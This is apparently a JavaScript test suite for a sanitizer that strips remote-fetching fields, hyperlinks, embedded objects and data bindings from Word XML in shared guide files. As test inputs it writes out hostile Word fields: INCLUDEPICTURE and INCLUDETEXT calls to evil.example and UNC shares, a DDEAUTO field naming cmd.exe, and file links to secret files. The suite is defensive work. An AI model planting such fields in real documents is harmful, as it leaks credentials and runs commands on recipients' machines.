// A guide file is data a person may be sent. Its paragraphs are Word XML that goes into the Word files the program makes, and the program tells
// the person to update every field in Word. So nothing that makes Word reach outside the file may stay in a paragraph (src/guide-xml-clean.mjs):
// not a field other than the program's own, not a link, an object or an address. What the program writes itself passes through untouched.
import test from 'node:test';
import assert from 'node:assert/strict';
import JSZip from 'jszip';
import {DOMParser,XMLSerializer} from '@xmldom/xmldom';
import {cleanParagraphXml,fieldAllowed} from '../src/guide-xml-clean.mjs';
import {createDemoAdapter} from '../src/guide-word.mjs';
import {docxFromPackage} from '../src/guide-docx.mjs';
import {para,run,standardPages} from '../src/guide-ooxml.mjs';
import {formTitleBlock,formText,writingLines,writingBox,fieldRow,checkList,formTable,ratingGrid,sourceLine,printLine,cardSet,citationControl} from '../src/guide-forms-ooxml.mjs';
import {STYLE_IDS} from '../src/guide-styles.mjs';
import {parseProject,serializeProject} from '../src/guide-project.mjs';
import {started,addModule,addLesson,addBlock} from './helpers/guide-harness.mjs';

const io={parse:xml=>new DOMParser().parseFromString(xml,'application/xml'),serialize:el=>new XMLSerializer().serializeToString(el)};
const W='xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main" xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships"';
const P=inner=>`<w:p ${W}>${inner}</w:p>`;
const field=(code,result,extra='')=>`<w:r><w:fldChar w:fldCharType="begin"/></w:r><w:r><w:instrText xml:space="preserve"> ${code} </w:instrText></w:r><w:r><w:fldChar w:fldCharType="separate"/></w:r><w:r>${extra}<w:t>${result}</w:t></w:r><w:r><w:fldChar w:fldCharType="end"/></w:r>`;
const clean=xml=>cleanParagraphXml(xml,io);

test('only the program\'s own fields are allowed, and never one that names an address',()=>{
  for(const ok of [' TOC \\o "1-2" \\h \\z \\u ',' PAGE ',' NUMPAGES ','PAGE \\* MERGEFORMAT'])assert.equal(fieldAllowed(ok),true,ok);
  for(const bad of [' INCLUDEPICTURE "\\\\\\\\evil\\\\share\\\\x.png" ',' INCLUDETEXT "http://evil.example/a.docx" ',' LINK Word.Document.12 "file:///c:/x.docx" ',' HYPERLINK "file:///c:/x" ',' DDEAUTO c:\\\\windows\\\\system32\\\\cmd.exe ',' PAGEREF _Toc1 ',' TOC \\f "http://evil.example/x" ',' IF 1=1 "x" ','','(unfinished field)'])assert.equal(fieldAllowed(bad),false,bad);
});

test('a field that fetches something is taken out and keeps the words of its result; the program\'s own fields stay',()=>{
  const bad=clean(P(`<w:r><w:t>See </w:t></w:r>${field('INCLUDETEXT "\\\\\\\\evil\\\\share\\\\a.docx"','the shared text')}<w:r><w:t> now.</w:t></w:r>`));
  assert.ok(bad.removed>0&&bad.kinds.includes('field'));
  assert.doesNotMatch(bad.xml,/INCLUDETEXT|instrText|fldChar|evil/);
  assert.match(bad.xml,/See /);assert.match(bad.xml,/the shared text/);assert.match(bad.xml,/ now\./);
  assert.equal(io.parse(bad.xml).getElementsByTagName('parsererror').length,0,'and it is still well formed');
  for(const code of ['TOC \\o "1-2" \\h \\z \\u','PAGE','NUMPAGES']){
    const xml=P(field(code,'1'));
    const r=clean(xml);
    assert.equal(r.xml,xml,`${code} passes through, byte for byte`);
    assert.equal(r.removed,0);
  }
});

test('a simple field is taken out the same way, a link to a file loses its link, an internal link stays',()=>{
  const simple=clean(P(`<w:fldSimple w:instr=" INCLUDEPICTURE &quot;\\\\\\\\evil\\\\x.png&quot; "><w:r><w:t>pic result</w:t></w:r></w:fldSimple>`));
  assert.doesNotMatch(simple.xml,/fldSimple|INCLUDEPICTURE|evil/);assert.match(simple.xml,/pic result/);
  const ok=P(`<w:fldSimple w:instr=" PAGE "><w:r><w:t>1</w:t></w:r></w:fldSimple>`);
  assert.equal(clean(ok).xml,ok,'a page number stays');
  const link=clean(P(`<w:hyperlink r:id="rId9"><w:r><w:t>click here</w:t></w:r></w:hyperlink>`));
  assert.doesNotMatch(link.xml,/hyperlink|rId9/);assert.match(link.xml,/click here/);
  const fileLink=clean(P(field('HYPERLINK "file:///c:/secret.txt"','a file link')));
  assert.doesNotMatch(fileLink.xml,/HYPERLINK|file:|instrText/);assert.match(fileLink.xml,/a file link/);
  const internal=P(`<w:hyperlink w:anchor="_Toc12" w:history="1"><w:r><w:t>Go there</w:t></w:r></w:hyperlink>`);
  assert.equal(clean(internal).xml,internal,'a link inside the document stays');
});

test('objects, legacy pictures, attached files, controls, data bindings and floating drawings are taken out; a plain inline picture stays, without links or addresses',()=>{
  const nasty=[
    `<w:r><w:object><v:shape xmlns:v="urn:schemas-microsoft-com:vml"><v:imagedata r:id="rId5" o:href="http://evil.example/x.png" xmlns:o="urn:schemas-microsoft-com:office:office"/></v:shape></w:object></w:r>`,
    `<w:r><w:pict><v:shape xmlns:v="urn:schemas-microsoft-com:vml"/></w:pict></w:r>`,
    `<w:altChunk r:id="rId7"/>`,
    `<w:r><w:control r:id="rId8"/></w:r>`,
    `<w:sdt><w:sdtPr><w:dataBinding w:xpath="/a" w:storeItemID="{1}"/></w:sdtPr><w:sdtContent><w:r><w:t>bound</w:t></w:r></w:sdtContent></w:sdt>`,
    `<w:r><w:drawing><wp:anchor xmlns:wp="http://schemas.openxmlformats.org/drawingml/2006/wordprocessingDrawing"><a:graphic xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main"/></wp:anchor></w:drawing></w:r>`
  ];
  const r=clean(P(nasty.join('')+'<w:r><w:t>kept words</w:t></w:r>'));
  assert.doesNotMatch(r.xml,/object|pict|altChunk|control|dataBinding|anchor|imagedata|evil/);
  assert.match(r.xml,/kept words/);
  const pic=(extra,blip)=>`<w:r><w:drawing><wp:inline xmlns:wp="http://schemas.openxmlformats.org/drawingml/2006/wordprocessingDrawing"><wp:docPr id="1" name="p">${extra}</wp:docPr><a:graphic xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main"><a:graphicData uri="http://schemas.openxmlformats.org/drawingml/2006/picture"><pic:pic xmlns:pic="http://schemas.openxmlformats.org/drawingml/2006/picture"><pic:blipFill><a:blip ${blip}/></pic:blipFill></pic:pic></a:graphicData></a:graphic></wp:inline></w:drawing></w:r>`;
  const plain=P(pic('','r:embed="rIdPic1"'));
  assert.equal(clean(plain).xml,plain,'the author\'s own picture passes through untouched');
  const linked=clean(P(pic('<a:hlinkClick xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main" r:id="rId3"/>','r:embed="rIdPic1" r:link="rId4"')));
  assert.doesNotMatch(linked.xml,/hlinkClick|r:link|rId3|rId4/);assert.match(linked.xml,/r:embed="rIdPic1"/,'the picture is kept, without its link');
});

test('a field that is never closed, or an instruction with no field, cannot be used to hide one',()=>{
  const open=clean(P(`<w:r><w:fldChar w:fldCharType="begin"/></w:r><w:r><w:instrText> INCLUDETEXT "http://evil.example/a" </w:instrText></w:r><w:r><w:t>after</w:t></w:r>`));
  assert.doesNotMatch(open.xml,/INCLUDETEXT|fldChar|instrText/);assert.match(open.xml,/after/);
  const stray=clean(P(`<w:r><w:instrText> INCLUDETEXT "x" </w:instrText></w:r><w:r><w:fldChar w:fldCharType="end"/></w:r><w:r><w:t>words</w:t></w:r>`));
  assert.doesNotMatch(stray.xml,/instrText|fldChar/);assert.match(stray.xml,/words/);
  const nested=clean(P(`<w:r><w:fldChar w:fldCharType="begin"/></w:r><w:r><w:instrText> TOC \\o "1-2" </w:instrText></w:r><w:r><w:fldChar w:fldCharType="separate"/></w:r>${field('INCLUDETEXT "\\\\\\\\evil\\\\x"','inner')}<w:r><w:fldChar w:fldCharType="end"/></w:r>`));
  assert.match(nested.xml,/TOC/,'the contents field around it stays');
  assert.doesNotMatch(nested.xml,/INCLUDETEXT|evil/);assert.match(nested.xml,/inner/);
});

test('text that only looks like one of these (in the words, not the markup) is left alone, as are damaged and empty entries',()=>{
  const words=P(`<w:r><w:t>Type INCLUDETEXT or fldChar or hyperlink or href=x in the box</w:t></w:r>`);
  const r=clean(words);
  assert.equal(r.xml,words);assert.equal(r.removed,0);
  assert.equal(clean('').xml,'');
  assert.equal(clean('not xml <').xml,'not xml <');
  assert.equal(clean(undefined).xml,'');
});

// ---- what the program writes is never changed

async function everythingTheProgramWrites(){
  const a=await started('Forms guide');
  await addModule(a,'Naming it');await addLesson(a,'First','10');await addBlock(a,'ask','What makes it hard?',{notes:'Listen for blame.'});
  const at=a.adapter.snapshot().findIndex(p=>p.text.includes('What makes it hard?'));
  await a.adapter.insert(ctx=>
    formTitleBlock({id:'f1',label:'Handout',number:'1.1',title:'Goals'})+printLine({copies:{n:1,per:'person'},orientation:'landscape'})+formText('Fill this in.')
    +fieldRow([{label:'Name',width:'full'},{label:'Date',width:'short'}])+writingLines({count:2})+writingBox({lines:3})
    +checkList({items:['Read it','Try it'],columns:['When'],ctx})+formTable({columns:[{name:'Goal',weight:3},{name:'Done',kind:'check'}],rows:[['Plan ahead']],ctx,caption:'Goals'})
    +ratingGrid({statements:['I plan.'],evidence:true,ctx})+cardSet({cards:['Role A\nThe manager.']})+sourceLine('Credit.')
    +formTitleBlock({id:'f2',label:'Checklist',number:'1.2',title:'Set-up',facilitator:true})+formText('Facilitator only.')
    +para(STYLE_IDS.body,run('Give out ')+citationControl({id:'f1',text:'Handout 1.1: Goals'},ctx)+run(' now.')),{where:'after',after:at,spare:false});
  await a.adapter.insert(()=>standardPages('Forms guide'),{where:'after',after:0,spare:false});
  return a.adapter.exportState().paragraphs;
}

test('every paragraph the program itself writes (standard pages with the contents field, cues with their icons, forms, tables, check boxes, citations) passes through untouched',async()=>{
  const paragraphs=await everythingTheProgramWrites();
  assert.ok(paragraphs.length>30);
  assert.ok(paragraphs.some(p=>/fldChar/.test(p.xml)),'the contents field is among them');
  assert.ok(paragraphs.some(p=>/<w:drawing>/.test(p.xml)),'and the cues\' icons');
  assert.ok(paragraphs.some(p=>/<w:sdt>/.test(p.xml)),'and the check boxes and citations');
  for(const p of paragraphs.filter(p=>p.xml)){
    const r=clean(p.xml);
    assert.equal(r.removed,0,`nothing is taken out of: ${p.text.slice(0,40)}`);
    assert.equal(r.xml,p.xml);
  }
});

// ---- the whole route: a guide file that was sent, opened, saved as a Word file

const BAD=[
  `<w:p ${W}><w:r><w:t>Look at </w:t></w:r>${field('INCLUDEPICTURE "\\\\\\\\evil.example\\\\share\\\\logo.png"','the logo')}<w:hyperlink r:id="rId77"><w:r><w:t> or this link</w:t></w:r></w:hyperlink>${field('HYPERLINK "file:///c:/Users/me/secret.docx"',' and this file')}</w:p>`,
  `<w:p ${W}><w:fldSimple w:instr=" INCLUDETEXT &quot;http://evil.example/a.docx&quot; "><w:r><w:t>included</w:t></w:r></w:fldSimple></w:p>`
];

test('a guide file that carries fetching fields and file links is cleaned when it is opened, and none of it reaches the Word file',async()=>{
  const sent=serializeProject({title:'Sent to you',paragraphs:BAD.map(xml=>({xml,text:'Look at the logo or this link and this file',style:'Normal'}))});
  const {guide}=parseProject(sent);
  assert.match(guide.paragraphs[0].xml,/INCLUDEPICTURE/,'the file itself is data and is read as it is');
  const a=createDemoAdapter({DOMParserClass:DOMParser,SerializerClass:XMLSerializer});
  a.importState(guide);
  const held=a.exportState().paragraphs.map(p=>p.xml).join('\n');
  assert.doesNotMatch(held,/INCLUDEPICTURE|INCLUDETEXT|HYPERLINK|instrText|fldSimple|hyperlink|evil|file:/,'the guide holds none of it after opening');
  assert.match(held,/the logo/);assert.match(held,/or this link/);assert.match(held,/and this file/);assert.match(held,/included/,'the words stay');
  const zip=await JSZip.loadAsync(await docxFromPackage(await a.sourcePackage(),JSZip,io,{entries:a.exportState().paragraphs}));
  const doc=await zip.file('word/document.xml').async('string');
  assert.doesNotMatch(doc,/INCLUDEPICTURE|INCLUDETEXT|HYPERLINK|fldSimple|evil|file:/);
  assert.match(doc,/Look at /);
  // and it is cleaned again when the Word file is made, in case something reached the paragraphs another way
  const direct=await JSZip.loadAsync(await docxFromPackage(await a.sourcePackage(),JSZip,io,{entries:BAD.map(xml=>({xml,text:'x',style:'Normal'}))}));
  assert.doesNotMatch(await direct.file('word/document.xml').async('string'),/INCLUDEPICTURE|INCLUDETEXT|HYPERLINK|fldSimple|evil|file:/);
});

test('the guide saved again after opening is the clean one',async()=>{
  const a=createDemoAdapter({DOMParserClass:DOMParser,SerializerClass:XMLSerializer});
  a.importState(parseProject(serializeProject({title:'T',paragraphs:BAD.map(xml=>({xml,text:'t',style:'Normal'}))})).guide);
  const again=serializeProject(a.exportState());
  assert.doesNotMatch(again,/INCLUDEPICTURE|INCLUDETEXT|HYPERLINK|evil/);
});
